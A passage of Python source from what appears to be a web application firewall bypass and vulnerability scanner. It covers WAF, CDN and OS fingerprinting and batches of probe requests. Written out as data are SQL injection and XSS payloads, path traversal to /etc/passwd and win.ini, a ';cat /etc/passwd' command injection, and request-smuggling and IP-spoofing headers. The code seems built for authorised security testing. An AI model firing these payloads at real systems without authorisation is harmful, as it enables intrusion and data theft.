            # HIGH: Different content. Static page -> hash; dynamic -> normalized similarity.
            if size_diff > 100:
                if not self._baseline_dynamic and current_hash != self._baseline_hash:
                    return {
                        'bypass': True,
                        'reason': 'Different content returned (hash mismatch)',
                        'severity': 'HIGH'
                    }
                if self._baseline_dynamic:
                    cur_norm = _normalize_body(response.text if current_size else "")
                    ratio = difflib.SequenceMatcher(None, self._baseline_norm, cur_norm).quick_ratio()
                    if ratio < 0.90:
                        return {
                            'bypass': True,
                            'reason': f'Different content ({ratio*100:.0f}% similar after token-normalization)',
                            'severity': 'HIGH'
                        }
            
            # CRITICAL: Backend error exposed - use pre-compiled regex
            body_lower = response.text[:5000].lower()
            match = ERROR_PATTERNS.search(body_lower)
            if match:
                severity = 'CRITICAL' if match.group(1) in ['exception', 'traceback', 'sql syntax', 'mysql_', 'postgresql'] else 'HIGH'
                return {
                    'bypass': True,
                    'reason': f'Backend exposed: "{match.group(1)}" found',
                    'severity': severity
                }
            
            # MEDIUM: Backend server header exposed
            if 'server' in response.headers:
                server = response.headers['server'].lower()
                if BACKEND_PATTERNS.search(server):
                    baseline_server = self._baseline_headers.get('server', '').lower()
                    if not BACKEND_PATTERNS.search(baseline_server):
                        return {
                            'bypass': True,
                            'reason': f'Backend server exposed: {response.headers["server"]}',
                            'severity': 'MEDIUM'
                        }
            
            # MEDIUM: X-Powered-By header exposed
            if 'x-powered-by' in response.headers:
                if 'x-powered-by' not in self._baseline_headers:
                    return {
                        'bypass': True,
                        'reason': f'Backend tech exposed: {response.headers["x-powered-by"]}',
                        'severity': 'MEDIUM'
                    }
            
            # MEDIUM: Different redirect location
            if response.status_code in [301, 302, 307, 308]:
                baseline_location = self._baseline_headers.get('location', '')
                current_location = response.headers.get('location', '')
                if current_location and current_location != baseline_location:
                    return {
                        'bypass': True,
                        'reason': f'Different redirect: {current_location}',
                        'severity': 'MEDIUM'
                    }
            
            # No bypass detected
            return {'bypass': False, 'reason': 'Response identical to baseline', 'severity': 'INFO'}
        
        except Exception as e:
            logger.error(f"Error in bypass detection: {e}")
            return {'bypass': False, 'reason': f'Detection error: {str(e)}', 'severity': 'INFO'}
    
    def _batch_test(self, test_cases: List[Dict], method: str = 'GET',
                    verbose: bool = True,
                    include_observations: bool = False) -> List[Dict[str, Any]]:
        """
        Optimized batch testing - run multiple tests in parallel
        
        Args:
            test_cases: List of dicts with 'headers', 'path', and optional 'technique' keys
            method: HTTP method to use
            verbose: Whether to print bypass results
        
        Returns:
            List of findings/candidates. Negative wire observations are returned
            only when ``include_observations`` is explicitly requested.
        """
        results = []
        if not test_cases:
            return results

        def run_single_test(test_case):
            headers = dict(test_case.get('headers', {}))
            path = test_case.get('path', '/')
            # Technique is tracked out-of-band; accept it from the test case or a
            # legacy X-Technique header, but never send it on the wire.
            technique = test_case.get('technique') or headers.pop('X-Technique', None) or 'Unknown'
            data = test_case.get('data')
            probe = dict(test_case.get('probe') or {})
            for key in ('category', 'payload', 'parameter', 'insertion_point',
                        'oracle', 'detector_id', 'control'):
                if key in test_case and key not in probe:
                    probe[key] = test_case[key]
            return self._test_request(headers, method=test_case.get('method', method),
                                      path=path, technique=technique, data=data,
                                      probe=probe)

        def _collect(future):
            try:
                result = future.result()
                if result and (result.get('bypass') or include_observations):
                    results.append(result)
                    if verbose and result.get('bypass'):
                        print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
            except Exception as e:
                logger.debug(f"Batch test error: {e}")

        # Prefer the single shared scan-wide pool. Techniques run sequentially, so
        # only one batch is in flight at a time and total concurrency stays bounded
        # to self.threads. Fall back to a private pool when called outside scan()
        # (e.g. detection phase or standalone use).
        executor = self._executor
        if executor is not None:
            futures = {executor.submit(run_single_test, tc): tc for tc in test_cases}
            for future in as_completed(futures):
                _collect(future)
        else:
            with ThreadPoolExecutor(max_workers=min(len(test_cases), self.threads)) as ex:
                futures = {ex.submit(run_single_test, tc): tc for tc in test_cases}
                for future in as_completed(futures):
                    _collect(future)

        return results

    def _test_host_header_injection(self) -> List[Dict[str, Any]]:
        """Test Host header manipulation - optimized batch"""
        test_cases = [
            {'headers': {'Host': 'localhost'}, 'technique': 'Host: localhost'},
            {'headers': {'Host': '127.0.0.1'}, 'technique': 'Host: 127.0.0.1'},
            {'headers': {'Host': f'{self.domain}:80'}, 'technique': f'Host: {self.domain}:80'},
            {'headers': {'Host': f'{self.domain}:443'}, 'technique': f'Host: {self.domain}:443'},
        ]
        return self._batch_test(test_cases)
    
    def _test_x_forwarded_for(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-For bypass - optimized batch"""
        ips = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '169.254.169.254']
        test_cases = [
            {'headers': {'X-Forwarded-For': ip}, 'technique': f'X-Forwarded-For: {ip}'}
            for ip in ips
        ]
        return self._batch_test(test_cases)
    
    def _test_x_forwarded_host(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-Host bypass - optimized batch"""
        hosts = ['localhost', '127.0.0.1', self.domain]
        test_cases = [
            {'headers': {'X-Forwarded-Host': host}, 'technique': f'X-Forwarded-Host: {host}'}
            for host in hosts
        ]
        return self._batch_test(test_cases)
    
    def _test_x_original_url(self) -> List[Dict[str, Any]]:
        """Test X-Original-URL bypass - optimized batch"""
        paths = ['/', '/admin', '/%2e%2e/', '/..;/']
        test_cases = [
            {'headers': {'X-Original-URL': path}, 'technique': f'X-Original-URL: {path}'}
            for path in paths
        ]
        return self._batch_test(test_cases)
    
    def _test_cache_control(self) -> List[Dict[str, Any]]:
        """Test Cache-Control bypass - optimized batch"""
        test_cases = [
            {'headers': {'Cache-Control': 'no-cache'}, 'technique': 'Cache-Control: no-cache'},
            {'headers': {'Cache-Control': 'no-store'}, 'technique': 'Cache-Control: no-store'},
            {'headers': {'Pragma': 'no-cache'}, 'technique': 'Pragma: no-cache'},
        ]
        return self._batch_test(test_cases)
    
    def _test_encoding_bypass(self) -> List[Dict[str, Any]]:
        """Test encoding bypass - optimized batch"""
        paths = ['/%2e/', '/..%2f', '/%252e%252e/']
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Path Encoding: {path}'}
            for path in paths
        ]
        return self._batch_test(test_cases)
    
    def _test_method_bypass(self) -> List[Dict[str, Any]]:
        """Test HTTP method bypass"""
        results = []
        methods = ['POST', 'OPTIONS', 'PUT', 'DELETE']
        
        for method in methods:
            result = self._test_request({'X-Technique': f'Method: {method}'}, method=method)
            if result:
                results.append(result)
                if result.get('bypass'):
                    print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_content_type_bypass(self) -> List[Dict[str, Any]]:
        """Test Content-Type bypass - optimized batch"""
        content_types = ['application/json', 'application/xml', 'text/plain', 'multipart/form-data']
        test_cases = [
            {'headers': {'Content-Type': ct}, 'method': 'POST', 'technique': f'Content-Type: {ct}'}
            for ct in content_types
        ]
        return self._batch_test(test_cases)
    
    def _test_transfer_encoding_smuggling(self) -> List[Dict[str, Any]]:
        """Test Transfer-Encoding smuggling bypass - optimized batch"""
        test_cases = [
            {'headers': {'Transfer-Encoding': 'chunked'}, 'method': 'POST', 'technique': 'Transfer-Encoding: chunked'},
            {'headers': {'Transfer-Encoding': ' chunked'}, 'method': 'POST', 'technique': 'Transfer-Encoding: [space]chunked'},
            {'headers': {'Transfer-Encoding': 'ChUnKeD'}, 'method': 'POST', 'technique': 'Transfer-Encoding: ChUnKeD'},
            {'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '0'}, 'method': 'POST', 'technique': 'CL.TE Smuggling'},
        ]
        return self._batch_test(test_cases)
    
    def _test_http2_downgrade(self) -> List[Dict[str, Any]]:
        """Test HTTP/2 to HTTP/1.1 downgrade bypass - optimized batch"""
        test_cases = [
            {'headers': {'Connection': 'HTTP2-Settings', 'Upgrade': 'h2c'}, 'technique': 'HTTP/2 Downgrade: h2c'},
            {'headers': {'Connection': 'Upgrade', 'Upgrade': 'HTTP/2.0'}, 'technique': 'HTTP/2 Downgrade: HTTP/2.0'},
            {'headers': {'Connection': 'close'}, 'technique': 'HTTP/1.0 Fallback'},
        ]
        return self._batch_test(test_cases)
    
    def _test_websocket_upgrade(self) -> List[Dict[str, Any]]:
        """Test WebSocket upgrade bypass - optimized batch"""
        test_cases = [
            {'headers': {'Upgrade': 'websocket', 'Connection': 'Upgrade', 'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==', 'Sec-WebSocket-Version': '13'}, 'technique': 'WebSocket Upgrade (Standard)'},
            {'headers': {'upgrade': 'WebSocket', 'connection': 'upgrade'}, 'technique': 'WebSocket Upgrade (Case Variation)'},
        ]
        return self._batch_test(test_cases)
    
    def _test_range_header(self) -> List[Dict[str, Any]]:
        """Test Range header bypass - optimized batch"""
        test_cases = [
            {'headers': {'Range': 'bytes=0-1024'}, 'technique': 'Range: bytes=0-1024'},
            {'headers': {'Range': 'bytes=0-0'}, 'technique': 'Range: Single Byte'},
            {'headers': {'Range': 'bytes=-500'}, 'technique': 'Range: Last 500 Bytes'},
        ]
        return self._batch_test(test_cases)
    
    def _test_double_encoding(self) -> List[Dict[str, Any]]:
        """Test double/triple encoding bypass - optimized batch"""
        test_cases = [
            {'headers': {}, 'path': '/%252e%252e/', 'technique': 'Double Encoded: ../'},
            {'headers': {}, 'path': '/%25252e%25252e%25252f', 'technique': 'Triple Encoded: ../'},
            {'headers': {}, 'path': '/%u002e%u002e%u002f', 'technique': 'Unicode Encoded: ../'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # WAF DETECTION & FINGERPRINTING
    # ============================================================================
    
    def _detect_waf(self) -> List[Dict[str, Any]]:
        """Detect WAF vendor and version"""
        results = []
        print("  [*] Detecting WAF vendor...")
        
        try:
            # Make baseline request for WAF detection
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            cookies_str = str(resp.cookies.get_dict()).lower()
            server_header = headers_lower.get('server', '').lower()
            body_lower = resp.text.lower()[:5000]  # Check first 5KB
            
            detected_wafs = []
            
            for waf_name, signatures in WAF_SIGNATURES.items():
                confidence = 0
                matched_indicators = []
                
                # Check headers
                for sig_header in signatures.get('headers', []):
                    if sig_header.lower() in headers_lower:
                        confidence += 30
                        matched_indicators.append(f"Header: {sig_header}")
                
                # Check cookies
                for sig_cookie in signatures.get('cookies', []):
                    if sig_cookie.lower() in cookies_str:
                        confidence += 25
                        matched_indicators.append(f"Cookie: {sig_cookie}")
                
                # Check server header
                for sig_server in signatures.get('server', []):
                    if sig_server.lower() in server_header:
                        confidence += 35
                        matched_indicators.append(f"Server: {sig_server}")
                
                # Check body patterns
                for pattern in signatures.get('body_patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 20
                        matched_indicators.append(f"Body: {pattern}")
                
                if confidence > 0:
                    detected_wafs.append({
                        'waf': waf_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched_indicators
                    })
            
            # Sort by confidence
            detected_wafs.sort(key=lambda x: x['confidence'], reverse=True)
            
            for waf in detected_wafs:
                severity = 'HIGH' if waf['confidence'] >= 70 else 'MEDIUM' if waf['confidence'] >= 40 else 'LOW'
                result = {
                    'technique': f"WAF Detection: {waf['waf'].upper()}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {waf['confidence']}% - {', '.join(waf['indicators'][:3])}",
                    'severity': severity,
                    'category': 'WAF_DETECTION',
                    'details': waf
                }
                results.append(result)
                print(f"  [+] Detected WAF: {waf['waf'].upper()} (Confidence: {waf['confidence']}%)")
            
            if not detected_wafs:
                print("  [*] No known WAF signatures detected")
                
        except requests.exceptions.ConnectionError:
            print("  [!] WAF detection skipped: Target unreachable")
        except Exception as e:
            logger.debug(f"WAF detection error: {e}")
        
        return results
    
    def _detect_cdn(self) -> List[Dict[str, Any]]:
        """Detect CDN provider"""
        results = []
        print("  [*] Detecting CDN...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            server_header = headers_lower.get('server', '').lower()
            
            detected_cdns = []
            
            for cdn_name, signatures in CDN_SIGNATURES.items():
                confidence = 0
                matched = []
                
                for sig_header in signatures.get('headers', []):
                    if sig_header.lower() in headers_lower:
                        confidence += 40
                        matched.append(f"Header: {sig_header}")
                
                for sig_server in signatures.get('server', []):
                    if sig_server.lower() in server_header:
                        confidence += 40
                        matched.append(f"Server: {sig_server}")
                
                # Check DNS CNAME records
                try:
                    import socket
                    cname = socket.gethostbyname_ex(self.domain)[0]
                    for cdn_cname in signatures.get('cnames', []):
                        if cdn_cname in cname:
                            confidence += 30
                            matched.append(f"CNAME: {cdn_cname}")
                except:
                    pass
                
                if confidence > 0:
                    detected_cdns.append({
                        'cdn': cdn_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            detected_cdns.sort(key=lambda x: x['confidence'], reverse=True)
            
            for cdn in detected_cdns:
                result = {
                    'technique': f"CDN Detection: {cdn['cdn'].upper()}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {cdn['confidence']}%",
                    'severity': 'INFO',
                    'category': 'CDN_DETECTION',
                    'details': cdn
                }
                results.append(result)
                print(f"  [+] Detected CDN: {cdn['cdn'].upper()} (Confidence: {cdn['confidence']}%)")
            
            if not detected_cdns:
                print("  [*] No known CDN detected")
                
        except Exception as e:
            logger.error(f"CDN detection error: {e}")
        
        return results
    
    def _detect_target_os(self) -> Tuple[str, int, List[Dict[str, Any]]]:
        """
        Detect the target server's operating system.
        
        Returns:
            Tuple of (os_name, confidence, results_list)
            os_name: 'linux', 'windows', or 'unknown'
            confidence: 0-100 indicating detection confidence
            results_list: List of detection results for reporting
        """
        print("  [*] Detecting target operating system...")
        results = []
        os_scores = {'linux': 0, 'windows': 0}
        os_indicators = {'linux': [], 'windows': []}
        
        try:
            # Make initial request
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                print("  [!] Could not detect OS - target unreachable")
                return 'unknown', 0, results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            server_header = headers_lower.get('server', '').lower()
            powered_by = headers_lower.get('x-powered-by', '').lower()
            body_lower = resp.text.lower()[:10000]  # Check first 10KB
            
            # Check each OS signature
            for os_name, signatures in OS_SIGNATURES.items():
                # Check server header patterns
                for pattern in signatures.get('server_patterns', []):
                    if pattern in server_header or pattern in powered_by:
                        os_scores[os_name] += 35
                        os_indicators[os_name].append(f"Server: {pattern}")
                
                # Check header patterns
                for pattern in signatures.get('header_patterns', []):
                    for header_val in headers_lower.values():
                        if pattern in header_val:
                            os_scores[os_name] += 20
                            os_indicators[os_name].append(f"Header: {pattern}")
                            break
                
                # Check path indicators in body (leaked paths)
                for indicator in signatures.get('path_indicators', []):
                    if indicator.lower() in body_lower:
                        os_scores[os_name] += 15
                        os_indicators[os_name].append(f"Path: {indicator}")
                
                # Check error patterns
                for pattern in signatures.get('error_patterns', []):
                    if pattern in body_lower:
                        os_scores[os_name] += 25
                        os_indicators[os_name].append(f"Error: {pattern}")
                
                # Check framework indicators
                for indicator in signatures.get('framework_indicators', []):
                    if indicator in server_header or indicator in powered_by:
                        os_scores[os_name] += 30
                        os_indicators[os_name].append(f"Framework: {indicator}")
            
            # Try triggering errors to reveal OS info
            error_test_paths = [
                "/../../../../../etc/passwd%00",  # Linux path
                "/../../../../../windows/win.ini%00",  # Windows path
                "/..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",  # Windows backslash
            ]
            
            for path in error_test_paths:
                try:
                    err_resp = self._scoped_safe_request(f"{self.target}{path}", timeout=self.timeout)
                    if err_resp is not None and err_resp.status_code in [400, 403, 404, 500]:
                        err_body = err_resp.text.lower()[:5000]
                        
                        # Check for OS-specific error messages
                        if any(x in err_body for x in ['\\windows\\', 'c:\\', 'system32', 'inetpub', 'iis']):
                            os_scores['windows'] += 30
                            os_indicators['windows'].append("Error response: Windows path")
                        
                        if any(x in err_body for x in ['/etc/', '/var/', '/usr/', '/home/', 'permission denied']):
                            os_scores['linux'] += 30
                            os_indicators['linux'].append("Error response: Linux path")
                except Exception:
                    pass
            
            # Determine detected OS
            linux_score = min(os_scores['linux'], 100)
            windows_score = min(os_scores['windows'], 100)
            
            if linux_score > windows_score and linux_score >= 30:
                detected_os = 'linux'
                confidence = linux_score
                indicators = os_indicators['linux']
            elif windows_score > linux_score and windows_score >= 30:
                detected_os = 'windows'
                confidence = windows_score
                indicators = os_indicators['windows']
            else:
                detected_os = 'unknown'
                confidence = 0
                indicators = []
            
            # Create result entry
            if detected_os != 'unknown':
                result = {
                    'technique': f'OS Detection: {detected_os.upper()}',
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {confidence}% - {', '.join(indicators[:3])}",
                    'severity': 'INFO',
                    'category': 'OS_DETECTION',
                    'details': {
                        'detected_os': detected_os,
                        'confidence': confidence,
                        'indicators': indicators,
                        'all_scores': os_scores
                    }
                }
                results.append(result)
                print(f"  [+] Detected OS: {detected_os.upper()} (Confidence: {confidence}%)")
                
                if indicators:
                    for ind in indicators[:3]:
                        print(f"      - {ind}")
            else:
                print("  [*] Could not determine target OS - will use universal exploits")
            
            # Store for later use
            self._detected_os = detected_os
            self._os_confidence = confidence
            
            return detected_os, confidence, results
            
        except Exception as e:
            logger.debug(f"OS detection error: {e}")
            print(f"  [!] OS detection error: {e}")
            return 'unknown', 0, results
    
    def _filter_techniques_by_os(self, techniques: List, detected_os: str) -> List:
        """
        Filter techniques based on detected operating system.
        
        Args:
            techniques: List of technique methods
            detected_os: Detected OS ('linux', 'windows', or 'unknown')
        
        Returns:
            Filtered list of techniques compatible with the detected OS
        """
        if detected_os == 'unknown':
            # If OS unknown, use all techniques
            return techniques
        
        filtered = []
        skipped_count = 0
        
        for technique in techniques:
            technique_name = technique.__name__
            compatibility = TECHNIQUE_OS_COMPATIBILITY.get(technique_name, 'all')
            
            # Include if compatible with all, or matches detected OS
            if compatibility == 'all' or compatibility == detected_os:
                filtered.append(technique)
            else:
                skipped_count += 1
                logger.debug(f"Skipping {technique_name} - not compatible with {detected_os}")
        
        if skipped_count > 0:
            print(f"  [*] Filtered out {skipped_count} techniques incompatible with {detected_os.upper()}")
        
        return filtered

    # ============================================================================
    # HEADER-BASED SCANS
    # ============================================================================
    
    def _test_header_injection(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-For, X-Real-IP spoofing"""
        results = []
        
        # Internal/trusted IP addresses
        trusted_ips = [
            '127.0.0.1',
            '10.0.0.1',
            '172.16.0.1', 
            '192.168.1.1',
            '169.254.169.254',  # AWS metadata
            '::1',  # IPv6 localhost
            'localhost',
        ]

        header_types = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Client-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Originating-IP',
            'True-Client-IP',
            'CF-Connecting-IP',
            'Fastly-Client-IP',
        ]
        test_cases = []
        for header in header_types:
            for ip in ['127.0.0.1', '10.0.0.1', '169.254.169.254']:
                test_cases.append({'headers': {header: ip}, 'technique': f'{header}: {ip}'})
        return self._batch_test(test_cases)
    
    def _test_origin_header_bypass(self) -> List[Dict[str, Any]]:
        """Manipulate Origin/Referer headers - optimized batch"""
        test_cases = [
            {'headers': {'Origin': 'null'}, 'technique': 'Origin: null'},
            {'headers': {'Origin': f'https://{self.domain}'}, 'technique': 'Origin: Same domain'},
            {'headers': {'Origin': 'https://localhost'}, 'technique': 'Origin: localhost'},
            {'headers': {'Referer': f'https://{self.domain}/'}, 'technique': 'Referer: Same origin'},
            {'headers': {'Referer': 'https://www.google.com/'}, 'technique': 'Referer: Google'},
            {'headers': {'Origin': 'null', 'Referer': 'null'}, 'technique': 'Origin+Referer: null'},
        ]
        return self._batch_test(test_cases)
    
    def _test_custom_header_fuzzing(self) -> List[Dict[str, Any]]:
        """Test for headers that bypass WAF rules - optimized batch"""
        test_cases = [
            {'headers': {'X-Custom-IP-Authorization': '127.0.0.1'}, 'technique': 'X-Custom-IP-Authorization'},
            {'headers': {'X-Requested-With': 'XMLHttpRequest'}, 'technique': 'X-Requested-With: XMLHttpRequest'},
            {'headers': {'X-Debug': 'true'}, 'technique': 'X-Debug: true'},
            {'headers': {'X-Skip-WAF': 'true'}, 'technique': 'X-Skip-WAF: true'},
            {'headers': {'X-Internal': 'true'}, 'technique': 'X-Internal: true'},
            {'headers': {'X-Rewrite-URL': '/'}, 'technique': 'X-Rewrite-URL'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # ENCODING BYPASS SCANS
    # ============================================================================
    
    def _test_case_manipulation(self) -> List[Dict[str, Any]]:
        """Test mixed case payloads - optimized batch"""
        case_paths = ['/Admin', '/ADMIN', '/AdMiN', '/admin/', '/.htaccess', '/.HTACCESS']
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Case Manipulation: {path}'}
            for path in case_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_comment_injection(self) -> List[Dict[str, Any]]:
        """Insert comments in payloads - optimized batch"""
        comment_paths = [
            "/?id=1'/**/OR/**/1=1",
            "/?id=1'/*!OR*/1=1",
            "/?id=1'--+-",
            "/?q=<scr<!---->ipt>",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Comment Injection: {path[:30]}'}
            for path in comment_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_whitespace_manipulation(self) -> List[Dict[str, Any]]:
        """Use tabs, newlines, null bytes - optimized batch"""
        whitespace_paths = [
            "/?id=1%09OR%091=1",
            "/?id=1%0aOR%0a1=1",
            "/?id=1%00OR%001=1",
            "/admin%00.html",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Whitespace: {path[:30]}'}
            for path in whitespace_paths
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # HTTP METHOD & PROTOCOL SCANS
    # ============================================================================
    
    def _test_http_method_override(self) -> List[Dict[str, Any]]:
        """Test X-HTTP-Method-Override headers"""
        results = []
        
        override_headers = [
            {'X-HTTP-Method-Override': 'PUT', 'X-Technique': 'X-HTTP-Method-Override: PUT'},
            {'X-HTTP-Method-Override': 'DELETE', 'X-Technique': 'X-HTTP-Method-Override: DELETE'},
            {'X-HTTP-Method-Override': 'PATCH', 'X-Technique': 'X-HTTP-Method-Override: PATCH'},
            {'X-HTTP-Method': 'PUT', 'X-Technique': 'X-HTTP-Method: PUT'},
            {'X-Method-Override': 'DELETE', 'X-Technique': 'X-Method-Override: DELETE'},
            {'_method': 'PUT', 'X-Technique': '_method: PUT (Rails)'},
            {'X-HTTP-Method-Override': 'CONNECT', 'X-Technique': 'X-HTTP-Method-Override: CONNECT'},
            {'X-HTTP-Method-Override': 'TRACE', 'X-Technique': 'X-HTTP-Method-Override: TRACE'},
        ]

        for headers in override_headers:
            # Try as both GET and POST
            for method in ['GET', 'POST']:
                result = self._test_request(headers, method=method)
                if result:
                    results.append(result)
                    if result.get('bypass'):
                        print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_http_parameter_pollution(self) -> List[Dict[str, Any]]:
        """Duplicate parameters to confuse WAF parsing - optimized batch"""
        hpp_paths = [
            "/?id=1&id=2",
            "/?id=safe&id=1'OR'1'='1",
            "/?cmd=ls&cmd=;cat /etc/passwd",
            "/?file=valid.txt&file=../../../etc/passwd",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'HTTP Parameter Pollution: {path[:30]}'}
            for path in hpp_paths
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # PROTOCOL-LEVEL SCANS
    # ============================================================================
    
    def _test_chunked_transfer(self) -> List[Dict[str, Any]]:
        """Split payloads across chunks - optimized batch"""
        test_cases = [
            {'headers': {'Transfer-Encoding': 'chunked'}, 'method': 'POST', 'technique': 'Chunked: Standard'},
            {'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '0'}, 'method': 'POST', 'technique': 'Chunked + CL: 0'},
            {'headers': {'Transfer-Encoding': ' chunked'}, 'method': 'POST', 'technique': 'Chunked: Leading space'},
        ]
        return self._batch_test(test_cases)
    
    def _test_http_pipelining(self) -> List[Dict[str, Any]]:
        """Test WAF handling of pipelined requests - optimized batch"""
        test_cases = [
            {'headers': {'Connection': 'keep-alive'}, 'technique': 'Connection: keep-alive'},
            {'headers': {'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=5, max=100'}, 'technique': 'Keep-Alive header'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # CACHE & CONTROL SCANS
    # ============================================================================
    
    def _test_cache_poisoning(self) -> List[Dict[str, Any]]:
        """Test WAF/cache interaction vulnerabilities - optimized batch"""
        cache_buster = f"?cb={int(time.time())}"
        test_cases = [
            {'headers': {'X-Original-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Original-URL cache poison'},
            {'headers': {'X-Rewrite-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Rewrite-URL cache poison'},
            {'headers': {'X-Forwarded-Host': 'blackthorn.invalid'}, 'path': cache_buster, 'technique': 'X-Forwarded-Host cache poison'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # PAYLOAD-BASED BYPASS SCANS
    # ============================================================================
    
    def _test_sqli_bypass(self) -> List[Dict[str, Any]]:
        """SQL injection detection using error and boolean-differential proof."""
        from .crawler import build_injection_path
        sql_errors = [
            r'you have an error in your sql syntax', r'warning.{0,80}mysql',
            r'mysql_(?:fetch|query|num_rows)', r'postgresql.{0,80}error',
            r'pg_query\s*\(', r'syntax error at or near',
            r'unterminated quoted string', r'unclosed quotation mark',
            r'microsoft ole db provider for sql server', r'sqlserver.{0,40}jdbc',
            r'ora-\d{5}', r'sqlite(?:3)?(?::| error)',
            r'near ["\'][^"\']+["\']: syntax error',
        ]
        error_oracle = {
            'type': 'regex', 'patterns': sql_errors, 'severity': 'HIGH',
            'reason': 'Database error appears only after the SQL probe',
            'verification_status': 'confirmed', 'kind': 'finding',
        }
        sqli_payloads = [
            "/?id=1'/**/OR/**/1=1--",
            "/?id=1'/*!50000OR*/1=1--",
            "/?id=1'%0aOR%0a1=1--",
            "/?id=1'oR'1'='1",
            "/?id=/*!12345UNION*//*!12345SELECT*/1",
            "/?id=-1'+UnIoN+SeLeCt+1,2,3--",
        ]
        test_cases = [
            {
                'headers': {}, 'path': path,
                'technique': f'SQL injection: {path[:30]}',
                'category': 'INJECTION', 'parameter': 'id',
                'payload': parse_qsl(urlsplit(path).query, keep_blank_values=True)[-1][1],
                'detector_id': 'sqli-error-differential-v2',
                'oracle': error_oracle,
            }
            for path in sqli_payloads
        ]
        results = [r for r in self._batch_test(test_cases)
                   if self._result_has_evidence(r, 'response_signature')]

        # Also fuzz real discovered parameters with DB-error signatures.
        raw = [
            "1'/**/OR/**/1=1--", "1'/*!50000OR*/1=1--", "1'%0aOR%0a1=1--",
            "1'oR'1'='1", "-1'+UnIoN+SeLeCt+1,2,3--", "1'--",
        ]
        raw += self.custom_payloads.get('sqli', [])
        fuzzed = self._fuzz_param_endpoints(
            raw, 'SQL injection', category='INJECTION', oracle=error_oracle,
            detector_id='sqli-error-differential-v2',
        )
        results.extend(r for r in fuzzed
                       if self._result_has_evidence(r, 'response_signature'))

        # A true predicate should behave like the benign request while a false
        # predicate diverges. This avoids calling reflection or a normal route
        # change SQL injection and uses no time/CPU-heavy payloads.
        targets = self._injection_targets()[:10]
        if not targets:
            targets = [{'path': '/', 'params': {'id': '1'}, 'method': 'GET'}]
        for ep in targets:
            path, params = ep['path'], dict(ep['params'])
            for parameter, original in params.items():
                base = str(original or '1')
                true_payload = f"{base}' AND '1'='1'-- -"
                false_payload = f"{base}' AND '1'='2'-- -"
                control_path = build_injection_path(path, params, parameter, base)

                def _boolean_probe(payload, label):
                    return self._test_request(
                        path=build_injection_path(path, params, parameter, payload),
                        technique=f'SQL injection boolean {label} [{parameter}]',
                        probe={
                            'category': 'INJECTION', 'payload': payload,
                            'parameter': parameter,
                            'insertion_point': {'type': 'query', 'name': parameter},
                            'detector_id': 'sqli-boolean-pair-v2',
                            'control': {'method': 'GET', 'path': control_path,
                                        'headers': {}, 'data': None},
                        },
                    )

                true_result = _boolean_probe(true_payload, 'true')
                false_result = _boolean_probe(false_payload, 'false')
                if not true_result or not false_result:
                    continue
                true_cmp = true_result.get('comparison') or {}
                false_cmp = false_result.get('comparison') or {}
                control_status = (true_result.get('baseline') or {}).get('status')
                true_matches = (
                    true_result.get('status') == control_status and
                    float(true_cmp.get('similarity', 0)) >= 0.92
                )
                false_differs = (
                    false_result.get('status') != control_status or
                    (float(false_cmp.get('similarity', 1)) < 0.72 and
                     abs(int(false_cmp.get('size_delta', 0))) > 20)
                )
                if not (true_matches and false_differs):
                    continue
                finding = true_result
                finding.update({
                    'bypass': True, 'severity': 'HIGH', 'confidence': 'high',
                    'verification_status': 'confirmed', 'kind': 'finding',
                    'reason': (f'Boolean SQL pair changed application behavior: '
                               f'true predicate matched control; false predicate differed'),
                    'payloads': [true_payload, false_payload],
                    'confirmations': 'paired true/false',
                    '_no_reconfirm': True,
                })
                finding.setdefault('evidence', []).append({
                    'type': 'boolean_differential',
                    'description': 'True branch matched the benign control and false branch diverged',
                    'matched': f"true={true_cmp}; false={false_cmp}", 'excerpt': '',
                })
                finding['reproductions'] = [true_result.get('curl'), false_result.get('curl')]
                results.append(finding)
        return results

    def _test_xss_bypass(self) -> List[Dict[str, Any]]:
        """Find unencoded reflections; browser execution remains the proof step."""
        xss_payloads = [
            "/?q=<svg/onload=alert(1)>",
